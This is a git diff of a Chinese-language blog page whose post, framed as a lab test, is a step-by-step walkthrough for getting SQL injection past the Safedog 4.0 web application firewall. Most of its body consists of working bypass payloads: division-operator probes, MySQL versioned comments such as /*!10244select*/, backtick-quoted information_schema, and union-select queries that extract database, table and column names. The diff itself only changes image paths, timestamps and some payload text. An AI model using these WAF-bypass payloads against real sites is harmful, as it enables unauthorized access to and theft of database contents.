@@ -125,28 +125,28 @@
 <meta property="og:site_name" content="错空&#39;s Blog">
 <meta property="og:description" content="实验环境window server 2012: 安全狗4.0 过狗首先第一步进行sql注入测试,在进行1&amp;#39; or 1=1的时候肯定是会被拦截的,因为最近做了一些ctf题目,知道可以用运算符来进行sql注入测试。首先来了解一下基本的原理一个字符串除0会返回NULL一个字符串除大于0的数会返回0一个字符串乘数字会大于0 那根据上面测试的结果进行sql注入测试返回了除了值等于NULL的数据没有返">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://cuokon.github.com/2019/10/10/sql过狗(联合注入)/images/1.png">
-<meta property="og:image" content="http://cuokon.github.com/2019/10/10/sql过狗(联合注入)/images/2.png">
-<meta property="og:image" content="http://cuokon.github.com/2019/10/10/sql过狗(联合注入)/images/3.png">
-<meta property="og:image" content="http://cuokon.github.com/2019/10/10/sql过狗(联合注入)/images/4.png">
-<meta property="og:image" content="http://cuokon.github.com/2019/10/10/sql过狗(联合注入)/images/5.png">
-<meta property="og:image" content="http://cuokon.github.com/2019/10/10/sql过狗(联合注入)/images/6.png">
-<meta property="og:image" content="http://cuokon.github.com/2019/10/10/sql过狗(联合注入)/images/8.png">
-<meta property="og:image" content="http://cuokon.github.com/2019/10/10/sql过狗(联合注入)/images/9.png">
-<meta property="og:image" content="http://cuokon.github.com/2019/10/10/sql过狗(联合注入)/images/10.png">
-<meta property="og:image" content="http://cuokon.github.com/2019/10/10/sql过狗(联合注入)/images/11.png">
-<meta property="og:image" content="http://cuokon.github.com/2019/10/10/sql过狗(联合注入)/images/1570708378050.png">
-<meta property="og:image" content="http://cuokon.github.com/2019/10/10/sql过狗(联合注入)/images/12.png">
-<meta property="og:image" content="http://cuokon.github.com/2019/10/10/sql过狗(联合注入)/images/13.png">
-<meta property="og:image" content="http://cuokon.github.com/2019/10/10/sql过狗(联合注入)/images/14.png">
-<meta property="og:image" content="http://cuokon.github.com/2019/10/10/sql过狗(联合注入)/images/15.png">
-<meta property="og:image" content="http://cuokon.github.com/2019/10/10/sql过狗(联合注入)/images/16.png">
-<meta property="og:image" content="http://cuokon.github.com/2019/10/10/sql过狗(联合注入)/images/1570710091192.png">
-<meta property="og:updated_time" content="2019-10-10T12:23:05.413Z">
+<meta property="og:image" content="http://cuokon.github.com/image/sql%E8%BF%87%E7%8B%97(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/1.png">
+<meta property="og:image" content="http://cuokon.github.com/image/sql%E8%BF%87%E7%8B%97(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/2.png">
+<meta property="og:image" content="http://cuokon.github.com/image/sql%E8%BF%87%E7%8B%97(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/3.png">
+<meta property="og:image" content="http://cuokon.github.com/image/sql%E8%BF%87%E7%8B%97(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/4.png">
+<meta property="og:image" content="http://cuokon.github.com/image/sql%E8%BF%87%E7%8B%97(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/5.png">
+<meta property="og:image" content="http://cuokon.github.com/image/sql%E8%BF%87%E7%8B%97(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/6.png">
+<meta property="og:image" content="http://cuokon.github.com/image/sql%E8%BF%87%E7%8B%97(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/8.png">
+<meta property="og:image" content="http://cuokon.github.com/image/sql%E8%BF%87%E7%8B%97(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/9.png">
+<meta property="og:image" content="http://cuokon.github.com/image/sql%E8%BF%87%E7%8B%97(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/10.png">
+<meta property="og:image" content="http://cuokon.github.com/image/sql%E8%BF%87%E7%8B%97(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/11.png">
+<meta property="og:image" content="http://cuokon.github.com/image/sql%E8%BF%87%E7%8B%97(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/18.png">
+<meta property="og:image" content="http://cuokon.github.com/image/sql%E8%BF%87%E7%8B%97(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/12.png">
+<meta property="og:image" content="http://cuokon.github.com/image/sql%E8%BF%87%E7%8B%97(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/13.png">
+<meta property="og:image" content="http://cuokon.github.com/image/sql%E8%BF%87%E7%8B%97(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/14.png">
+<meta property="og:image" content="http://cuokon.github.com/image/sql%E8%BF%87%E7%8B%97(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/15.png">
+<meta property="og:image" content="http://cuokon.github.com/image/sql%E8%BF%87%E7%8B%97(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/16.png">
+<meta property="og:image" content="http://cuokon.github.com/image/sql%E8%BF%87%E7%8B%97(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/17.png">
+<meta property="og:updated_time" content="2019-10-17T13:40:26.025Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="sql过狗(联合注入)">
 <meta name="twitter:description" content="实验环境window server 2012: 安全狗4.0 过狗首先第一步进行sql注入测试,在进行1&amp;#39; or 1=1的时候肯定是会被拦截的,因为最近做了一些ctf题目,知道可以用运算符来进行sql注入测试。首先来了解一下基本的原理一个字符串除0会返回NULL一个字符串除大于0的数会返回0一个字符串乘数字会大于0 那根据上面测试的结果进行sql注入测试返回了除了值等于NULL的数据没有返">
-<meta name="twitter:image" content="http://cuokon.github.com/2019/10/10/sql过狗(联合注入)/images/1.png">
+<meta name="twitter:image" content="http://cuokon.github.com/image/sql%E8%BF%87%E7%8B%97(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/1.png">
 
 
 
@@ -444,13 +444,23 @@
                 
               
 
-              <time title="创建时间：2019-10-10 16:42:32 / 修改时间：20:23:05" itemprop="dateCreated datePublished" datetime="2019-10-10T16:42:32+08:00">2019-10-10</time>
+              <time title="创建时间：2019-10-10 16:42:32" itemprop="dateCreated datePublished" datetime="2019-10-10T16:42:32+08:00">2019-10-10</time>
             </span>
           
 
           
             
 
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-10-17 21:40:26" itemprop="dateModified" datetime="2019-10-17T21:40:26+08:00">2019-10-17</time>
+              </span>
             
           
 
@@ -527,35 +537,35 @@
       
 
       
-        <h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><p>window server 2012: 安全狗4.0<br><img src="./images/1.png" alt="1"></p>
-<h3 id="过狗"><a href="#过狗" class="headerlink" title="过狗"></a>过狗</h3><p>首先第一步进行sql注入测试,在进行<code>1&#39; or 1=1</code>的时候肯定是会被拦截的,因为最近做了一些ctf题目,知道可以用运算符来进行sql注入测试。<br>首先来了解一下基本的原理<br>一个字符串除0会返回NULL<br><img src="./images/2.png" alt="2"><br>一个字符串除大于0的数会返回0<br><img src="./images/3.png" alt="3"><br>一个字符串乘数字会大于0<br><img src="./images/4.png" alt="4"></p>
-<p>那根据上面测试的结果进行sql注入测试<br>返回了除了值等于NULL的数据<br><img src="./images/5.png" alt="5"><br>没有返回数据<br><img src="./images/6.png" alt="6"></p>
-<p>那来用来测试是否可以绕过安全狗<br><code>1&#39; or 1=1%23</code>被拦截<br><img src="./images/8.png" alt="8"><br><code>1&#39;/0%23</code>没有被拦截,返回空<br><img src="./images/9.png" alt="9"><br><code>1&#39;/1%23</code>没有被拦截,返回数据<br><img src="./images/10.png" alt="10"></p>
+        <h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><p>window server 2012: 安全狗4.0<br><img src="../../../../image/sql%E8%BF%87%E7%8B%97(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/1.png" alt="1"></p>
+<h3 id="过狗"><a href="#过狗" class="headerlink" title="过狗"></a>过狗</h3><p>首先第一步进行sql注入测试,在进行<code>1&#39; or 1=1</code>的时候肯定是会被拦截的,因为最近做了一些ctf题目,知道可以用运算符来进行sql注入测试。<br>首先来了解一下基本的原理<br>一个字符串除0会返回NULL<br><img src="../../../../image/sql%E8%BF%87%E7%8B%97(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/2.png" alt="2"><br>一个字符串除大于0的数会返回0<br><img src="../../../../image/sql%E8%BF%87%E7%8B%97(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/3.png" alt="3"><br>一个字符串乘数字会大于0<br><img src="../../../../image/sql%E8%BF%87%E7%8B%97(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/4.png" alt="4"></p>
+<p>那根据上面测试的结果进行sql注入测试<br>返回了除了值等于NULL的数据<br><img src="../../../../image/sql%E8%BF%87%E7%8B%97(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/5.png" alt="5"><br>没有返回数据<br><img src="../../../../image/sql%E8%BF%87%E7%8B%97(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/6.png" alt="6"></p>
+<p>那来用来测试是否可以绕过安全狗<br><code>1&#39; or 1=1%23</code>被拦截<br><img src="../../../../image/sql%E8%BF%87%E7%8B%97(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/8.png" alt="8"><br><code>1&#39;/0%23</code>没有被拦截,返回空<br><img src="../../../../image/sql%E8%BF%87%E7%8B%97(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/9.png" alt="9"><br><code>1&#39;/1%23</code>没有被拦截,返回数据<br><img src="../../../../image/sql%E8%BF%87%E7%8B%97(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/10.png" alt="10"></p>
 <p>第二步猜测有多少个字段</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and order 不拦截</span><br><span class="line">1&apos; and by   不拦截</span><br><span class="line">1&apos; and order by 拦截</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&apos; order 不拦截</span><br><span class="line">1&apos; by   不拦截</span><br><span class="line">1&apos; order by 拦截</span><br></pre></td></tr></table></figure>
 
-<p>可以用<code>/*!10244by*/</code>,来绕过,10244是通过fuzz得来的,图片的数字基本上都可以,可能大家想问为什么不用为什么不用<code>/*!10244order*/</code>呢,因为我没有成功。:(<br><img src="./images/11.png" alt="11"><br>输入<code>a&#39;  and order /*!10244by*/3%23</code>,发现没有拦截<br><img src="./images/1570708378050.png" alt="enter description here"></p>
+<p>可以用<code>/*!10244by*/</code>,来绕过,10244是通过fuzz得来的,图片的数字基本上都可以,可能大家想问为什么不用为什么不用<code>/*!10244order*/</code>呢,因为我没有成功。:(<br><img src="../../../../image/sql%E8%BF%87%E7%8B%97(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/11.png" alt="11"><br>输入<code>a&#39; order /*!10244by*/3%23</code>,发现没有拦截<br><img src="../../../../image/sql%E8%BF%87%E7%8B%97(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/18.png" alt="enter description here"></p>
 <p>然后查看有效字段</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&apos; union 不拦截</span><br><span class="line">1&apos; select 不拦截</span><br><span class="line">1&apos; union select 拦截</span><br></pre></td></tr></table></figure>
 
-<p>可以用<code>/*!1024select*/</code>来绕过<br>输入<code>1&#39; union /*!10244select*/ 1,2,3%23</code>,发现没有被拦截<br><img src="./images/12.png" alt="12"><br>然后爆数据库,因为他会匹配database()函数,所以<code>database/**/()</code>,不过这样也会被拦截,在看404大佬的bypass的时候是用<code>hex(database/**/())</code>来得到数据库名的16进制的,不过我测试发现用<code>(database/**/())</code>就可以了<br>利用hex获取数据库的16进制<br><img src="./images/13.png" alt="13"><br>直接获取数据库名<br><img src="./images/14.png" alt="14"></p>
+<p>可以用<code>/*!1024select*/</code>来绕过<br>输入<code>1&#39; union /*!10244select*/ 1,2,3%23</code>,发现没有被拦截<br><img src="../../../../image/sql%E8%BF%87%E7%8B%97(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/12.png" alt="12"><br>然后爆数据库,因为他会匹配database()函数,所以<code>database/**/()</code>,不过这样也会被拦截,在看404大佬的bypass的时候是用<code>hex(database/**/())</code>来得到数据库名的16进制的,不过我测试发现用<code>(database/**/())</code>就可以了<br>利用hex获取数据库的16进制<br><img src="../../../../image/sql%E8%BF%87%E7%8B%97(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/13.png" alt="13"><br>直接获取数据库名<br><img src="../../../../image/sql%E8%BF%87%E7%8B%97(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/14.png" alt="14"></p>
 <p>获取数据库表的信息<br>输入</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; union select 1,select group_concat(table_name) from information_schema.tables where table_schema=(database/**/()),3%23;</span><br></pre></td></tr></table></figure>
 
 <p>然后发现会被拦截,经过测试发现拦截的是information_schema这个关键字,我们可以加上``符号,来绕过</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; union /*!10244select*/ 1,(select group_concat(table_name) from `information_schema`.tables where table_schema=(database/**/())),3%23</span><br></pre></td></tr></table></figure>
 
-<p><img src="./images/15.png" alt="15"></p>
+<p><img src="../../../../image/sql%E8%BF%87%E7%8B%97(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/15.png" alt="15"></p>
 <p>爆破列名</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; union /*!10244select*/ 1,(select group_concat(column_name) from `information_schema`.columns where table_schema=(database/**/()) and table_name=&apos;user&apos;),3%23</span><br></pre></td></tr></table></figure>
 
 <p>发现被拦截了,经过测试是在table_name=’user’这里被拦截,我们依然可以用``进行绕过。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; union /*!10244select*/ 1,(select group_concat(column_name) from `information_schema`.columns where table_schema=(database/**/()) and `table_name`=&apos;class&apos;),3%23</span><br></pre></td></tr></table></figure>
 
-<p>发现被拦截了,然后尝试吧class转换为hex在进行绕过<br><img src="./images/16.png" alt="16"></p>
+<p>发现被拦截了,然后尝试吧class转换为hex在进行绕过<br><img src="../../../../image/sql%E8%BF%87%E7%8B%97(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/16.png" alt="16"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; union /*!10244select*/ 1,(select group_concat(column_name) from `information_schema`.columns where table_schema=(database/**/()) and `table_name`=&apos;class&apos;),3%23</span><br></pre></td></tr></table></figure>
 
-<p><img src="./images/1570710091192.png" alt="enter description here"></p>
+<p><img src="../../../../image/sql%E8%BF%87%E7%8B%97(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/17.png" alt="enter description here"></p>
 
       
     </div>
